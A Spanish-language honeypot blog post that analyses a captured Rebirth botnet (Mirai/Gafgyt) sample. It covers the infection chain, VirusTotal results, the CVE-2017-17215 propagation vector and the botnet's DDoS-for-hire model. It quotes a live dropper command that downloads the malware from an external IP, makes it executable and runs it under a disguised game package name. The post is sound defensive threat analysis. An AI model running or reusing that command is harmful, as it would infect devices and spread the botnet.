---
title: "Capturé una muestra del botnet Rebirth en mi honeypot: así opera por dentro"
date: 2026-07-09
draft: false
description: "Análisis de una muestra del botnet Rebirth (variante Mirai/Gafgyt) capturada en vivo en mi honeypot T-Pot: cadena de infección completa, ingeniería inversa, CVE-2017-17215 y el modelo de negocio DDoS-as-a-Service detrás."
tags: ["Honeypot", "TPot", "Botnet", "Mirai", "Rebirth", "Gafgyt", "ADB", "Android", "IoT", "DDoS", "CVE-2017-17215", "MalwareAnalysis", "ThreatIntel", "BlueTeam"]
categories: ["Honeypot Diaries"]
---

{{< lead >}}
Mientras revisaba el tráfico de mi honeypot T-Pot, encontré algo más interesante que el típico intento de fuerza bruta SSH: una cadena de infección completa, capturada en vivo, correspondiente a una variante del botnet **Rebirth**, basado en Mirai/Gafgyt. Este post documenta el hallazgo, el proceso de investigación y qué nos dice sobre el estado actual de las botnets IoT.
{{< /lead >}}

---

## El Hallazgo

El honeypot que capturó esto fue **Adbhoney**, uno de los sensores de T-Pot que simula el protocolo **ADB (Android Debug Bridge)** — el sistema de depuración remota de Android, que cuando queda expuesto a internet sin autenticación es una puerta de entrada trivial para atacantes automatizados.

El comando ejecutado por el atacante, capturado literalmente:

```bash
toybox wget http://94.154.43.48/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal
chmod 777 /data/local/tmp/com.supercell.clashroyal
./data/local/tmp/com.supercell.clashroyal adb
```

Tres pasos, típicos de un dropper automatizado:

1. **Descarga** un binario (`rebirth.arm7`) desde un servidor remoto usando `toybox` — una utilidad tipo BusyBox preinstalada en la mayoría de sistemas Android, por lo que el atacante no depende de tener herramientas adicionales en el dispositivo objetivo.
2. **Le da permisos de ejecución totales** (`chmod 777`).
3. **Lo ejecuta** pasándole `adb` como argumento — probablemente indicándole al malware que use ese vector para seguir propagándose a otros dispositivos con ADB expuesto.

El detalle más llamativo es el nombre con el que se guarda el archivo: **`com.supercell.clashroyal`**, el identificador de paquete real del juego Clash Royale. No es casualidad — es camuflaje deliberado para que el binario pase desapercibido si alguien revisa los procesos corriendo en el dispositivo.

---

## La Investigación: de un Hash sin Resultados a una Familia Confirmada

El primer paso fue calcular el hash SHA256 del archivo capturado, que T-Pot había guardado automáticamente usando el propio hash como nombre de fichero:

```
849840d92c44ed04af624abd9e5d79a7a082016c89ac39ac50d19f3d537839b5
```

Al buscarlo en VirusTotal, la primera consulta no arrojó resultados — el hash aparecía como no analizado. Esto no es inusual: las botnets tipo Mirai/Gafgyt recompilan sus binarios constantemente, con variaciones mínimas que cambian el hash sin cambiar el comportamiento, como técnica básica de evasión contra la detección por firma.

Unos días después, la muestra ya estaba registrada en VirusTotal — probablemente subida por otro investigador que capturó una copia idéntica. Los comentarios de la comunidad en la ficha lo confirman: al menos dos investigadores más reportan haberla capturado "in the wild" en fechas similares.

### Lo que Confirmó el Análisis

Con la muestra ya indexada, los resultados fueron contundentes:

| Campo | Resultado |
|-------|-----------|
| **Detección** | 39 de 63 motores antivirus |
| **Etiqueta popular** | `trojan.mirai/smmr1` |
| **Categorías** | trojan, dropper, worm |
| **Family labels** | mirai, smmr1, camelot |
| **Arquitectura** | ELF ARM — 194.51 KB |

El análisis de comportamiento describe el binario como un **botnet IoT** con las siguientes capacidades:

- **Auto-propagación** mediante un escáner que explota específicamente **CVE-2017-17215**, una vulnerabilidad RCE en routers **Huawei HG532**, a través de una petición `POST /ctrlt/DeviceUpgrade_1` con credenciales hardcodeadas.
- **Módulo "killer"**: recorre `/proc` para identificar y matar procesos de malware competidor — comportamiento típico de botnets que quieren tener el dispositivo en exclusiva.
- **Múltiples vectores de ataque DDoS**: TCP SYN/ACK/STOMP, UDP genérico/hex/bypass, y ataques GRE/IP.
- **Comunicación C2 cifrada** con ChaCha20 y ofuscación de strings mediante RC4.
- **Persistencia y anti-análisis**: renombrado del propio ejecutable y binding a un puerto fijo (54953) para garantizar que solo corra una instancia a la vez.

Varias reglas YARA de la comunidad (Elastic Security, Florian Roth/Nextron Systems) también coincidieron con firmas conocidas de Mirai y, específicamente, con el exploit de CVE-2017-17215 asociado a la familia relacionada ZeroBot.

---

## ¿Qué es Rebirth?

Rebirth no es un experimento aislado — es un servicio activo de **DDoS-as-a-Service**: una botnet que se alquila. Investigación previa de Sysdig documentó esta campaña, señalando que estaría administrada bajo el alias **"Docx69"**, promocionada en Telegram y en streams de videojuegos, apuntando a un modelo de negocio dirigido a usuarios dispuestos a pagar por capacidad de ataque DDoS sin necesidad de conocimiento técnico propio.

Análisis anteriores sitúan a esta familia como construida sobre **Gafgyt**, heredando capacidades de otras familias como QBot y STDBot — lo que encaja con el comportamiento modular observado en la muestra (propagación, DDoS, eliminación de competidores).

---

## Por qué Esto Importa

**Las vulnerabilidades viejas siguen siendo rentables.** CVE-2017-17215 tiene ya varios años. Que una botnet activa en 2026 siga incluyéndola como vector de propagación primario dice mucho sobre cuántos dispositivos IoT y routers domésticos nunca se actualizan — y sobre lo barato que sigue siendo explotar vulnerabilidades antiguas antes que invertir en descubrir nuevas.

**El mercado de DDoS sigue siendo accesible.** Que el operador de Rebirth se promocione en Telegram y en streams de gaming no es un detalle anecdótico — refleja que este tipo de herramientas ya no requieren conocimiento técnico avanzado para usarse, solo para operarse por quien las vende.

**El camuflaje no es solo para humanos.** El disfraz como `com.supercell.clashroyal` es un recordatorio de que incluso en malware automatizado hay pensamiento deliberado puesto en pasar desapercibido ante una revisión superficial — aquí, ante cualquier usuario del dispositivo infectado que revisara sus procesos activos.

---

## Resumen Técnico

| Campo | Valor |
|-------|-------|
| **Honeypot de captura** | Adbhoney (T-Pot) |
| **Fecha de captura** | 9 de julio de 2026 |
| **Servidor de origen** | 94.154.43.48 |
| **Nombre real del archivo** | rebirth.arm7 |
| **Nombre de disfraz** | com.supercell.clashroyal |
| **SHA256** | `849840d92c44ed04af624abd9e5d79a7a082016c89ac39ac50d19f3d537839b5` |
| **Arquitectura** | ELF ARM, 194.51 KB |
| **Detección VirusTotal** | 39/63 |
| **Familia** | Mirai/Gafgyt (Rebirth), smmr1 |
| **CVE de propagación** | CVE-2017-17215 (Huawei HG532) |

---

*Este análisis se basa únicamente en información obtenida de forma pasiva a través del honeypot y en fuentes públicas de threat intelligence (VirusTotal, investigación previa de Sysdig). En ningún momento se ejecutó el binario fuera del entorno aislado del honeypot.*
